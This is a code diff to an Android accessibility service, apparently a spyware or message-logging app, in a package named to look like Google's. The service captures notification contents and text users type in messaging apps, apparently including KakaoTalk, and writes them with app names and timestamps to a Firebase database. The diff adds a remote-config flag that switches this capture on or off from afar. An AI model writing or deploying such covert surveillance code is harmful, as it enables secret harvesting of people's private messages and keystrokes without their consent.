@@ -19,12 +19,24 @@ package smartmonitor.google.com.smartlogger;
 
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
+import android.app.Service;
+import android.content.Intent;
 import android.speech.tts.TextToSpeech.OnInitListener;
+import android.support.annotation.IntDef;
+import android.support.annotation.NonNull;
 import android.text.format.DateFormat;
+import android.util.Log;
 import android.view.KeyEvent;
 import android.view.accessibility.AccessibilityEvent;
 
+import com.google.android.gms.tasks.OnCompleteListener;
+import com.google.android.gms.tasks.Task;
+import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
+import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
+
+
 import java.util.Date;
+import java.util.concurrent.Executor;
 
 import smartmonitor.google.com.smartlogger.Data.AccessibilityData;
 import smartmonitor.google.com.smartlogger.writer.DataWritingInterface;
@@ -42,10 +54,8 @@ public class MyAccessibilityService extends AccessibilityService implements OnIn
     private DateFormat dateFormat;
     AccessibilityData data;
     private String message;
-    /**
-     * Tag for logging.
-     */
-    private static final String LOG_TAG = "onAccessibilityEvent";
+    private FirebaseRemoteConfig mFirebaseRemoteConfig;
+    private boolean monitorEnabled = true;
 
 
     /**
@@ -53,25 +63,25 @@ public class MyAccessibilityService extends AccessibilityService implements OnIn
      * putting together a message to speak to the user.
      */
     public void onAccessibilityEvent(AccessibilityEvent event) {
-
-        if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
-            data.setContents(event.getText().toString());
-            data.setApkName(event.getPackageName().toString());
-            data.setDate(getDate(System.currentTimeMillis()));
-            writer.write(data);
-        } else {
-            if (event.getText().toString().equals("[]") || event.getText().toString().equals("[메시지 쓰기...]")) {
-                if (message != null) {
-                    data.setContents(message);
-                    data.setApkName(event.getPackageName().toString());
-                    data.setDate(getDate(System.currentTimeMillis()));
-                    writer.write(data);
-                    message = null;
-                }
+        if (monitorEnabled) {
+            if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
+                data.setContents(event.getText().toString());
+                data.setApkName(event.getPackageName().toString());
+                data.setDate(getDate(System.currentTimeMillis()));
+                writer.write(data);
             } else {
-                message = event.getText().toString();
+                if (event.getText().toString().equals("[]") || event.getText().toString().equals("[메시지 쓰기...]")) {
+                    if (message != null) {
+                        data.setContents(message);
+                        data.setApkName(event.getPackageName().toString());
+                        data.setDate(getDate(System.currentTimeMillis()));
+                        writer.write(data);
+                        message = null;
+                    }
+                } else {
+                    message = event.getText().toString();
+                }
             }
-        }
 
 //        Log.e(TAG, "Catch Event Type: " + AccessibilityEvent.eventTypeToString(event.getEventType()));
 //        //Log.e(TAG, "Catch Event Package Name : " + event.getPackageName());
@@ -79,7 +89,7 @@ public class MyAccessibilityService extends AccessibilityService implements OnIn
 //        //Log.e(TAG, "Catch Event ContentDescription  : " + event.getContentDescription());
 //        //Log.e(TAG, "Catch Event getSource : " + event.getSource());
 //        //Log.e(TAG, "=========================================================================");
-
+        }
     }
 //
 //    private String getPrettyString(AccessibilityEvent event) {
@@ -97,35 +107,69 @@ public class MyAccessibilityService extends AccessibilityService implements OnIn
         return dateFormat.format(dataFormatYMDhms, new Date(milliSeconds)).toString();
     }
 
+    @Override
+    public void onCreate() {
+        Log.d(TAG, "onCreate");
+        super.onCreate();
+    }
+
+
     // 접근성 권한을 가지고, 연결이 되면 호출되는 함수
     public void onServiceConnected() {
-        writer = FirebaseDBWriter.getInstance();
-        info = new AccessibilityServiceInfo();
-        dateFormat = new DateFormat();
-        data = new AccessibilityData();
+        Log.d(TAG, "onServiceCOnnected");
+        //firebase remote config
+        mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
+        mFirebaseRemoteConfig.setDefaults(R.xml.remote_config_defaults);
+        mFirebaseRemoteConfig.fetch()
+                .addOnCompleteListener(new OnCompleteListener<Void>() {
+                    @Override
+                    public void onComplete(@NonNull Task<Void> task) {
+                        if (task.isSuccessful()) {
 
-        //TYPE_VIEW_TEXT_SELECTION_CHANGED //텍스트 입력시
-        //TYPE_NOTIFICATION_STATE_CHANGED //노티 도착시
-        //TYPE_VIEW_CLICKED //카톡방 새로운 글
-        //info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK - AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED - AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED; // 전체 이벤트 가져오기
-        //info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK - AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED - AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED; // 전체 이벤트 가져오기
-        info.eventTypes =
+                            // After config data is successfully fetched, it must be activated before newly fetched
+                            // values are returned.
+                            mFirebaseRemoteConfig.activateFetched();
+                            monitorEnabled = mFirebaseRemoteConfig.getBoolean("monitor_enabled");
+                            Log.d(TAG,"onComplete " + monitorEnabled);
+                            if (!monitorEnabled) {
+                                setServiceInfo(null);
+                            }
+                        } else {
+                            Log.d(TAG,"fail");
+                        }
+                    }
+                });
+
+        if (monitorEnabled) {
+
+            writer = FirebaseDBWriter.getInstance();
+            info = new AccessibilityServiceInfo();
+            dateFormat = new DateFormat();
+            data = new AccessibilityData();
+
+            //TYPE_VIEW_TEXT_SELECTION_CHANGED //텍스트 입력시
+            //TYPE_NOTIFICATION_STATE_CHANGED //노티 도착시
+            //TYPE_VIEW_CLICKED //카톡방 새로운 글
+            //info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK - AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED - AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED; // 전체 이벤트 가져오기
+            //info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK - AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED - AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED; // 전체 이벤트 가져오기
+            info.eventTypes =
 //                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
 //                        |
-                AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED
-                        |
-                        AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
+                    AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED
+                            |
+                            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
 //                        |
 //                        AccessibilityEvent.TYPE_VIEW_SCROLLED
 //                        |
 //                        AccessibilityEvent.TYPE_VIEW_CONTEXT_CLICKED
 //                        |
 //                        AccessibilityEvent.TYPE_VIEW_CLICKED
-        ;
-        info.feedbackType = AccessibilityServiceInfo.DEFAULT | AccessibilityServiceInfo.FEEDBACK_HAPTIC;
-        info.notificationTimeout = 100; // millisecond
+            ;
+            info.feedbackType = AccessibilityServiceInfo.DEFAULT | AccessibilityServiceInfo.FEEDBACK_HAPTIC;
+            info.notificationTimeout = 100; // millisecond
 
-        setServiceInfo(info);
+            setServiceInfo(info);
+        }
     }
 
     /**
@@ -153,6 +197,7 @@ public class MyAccessibilityService extends AccessibilityService implements OnIn
 
     @Override
     protected boolean onKeyEvent(KeyEvent event) {
+        Log.d(TAG,"onKeyEvent " + event.getKeyCode());
         return false;
     }
 }
